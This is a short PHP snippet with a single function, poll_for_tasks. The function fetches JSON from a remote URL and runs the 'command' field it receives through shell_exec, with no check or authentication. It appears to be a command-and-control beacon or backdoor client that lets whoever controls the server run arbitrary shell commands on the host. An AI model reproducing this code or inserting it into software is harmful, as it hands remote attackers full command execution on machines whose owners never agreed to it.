<?php
function poll_for_tasks($url) {
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $raw = curl_exec($ch);
  curl_close($ch);
  $resp = json_decode($raw, true);
  $cmd = $resp["command"];
  return shell_exec($cmd);
}
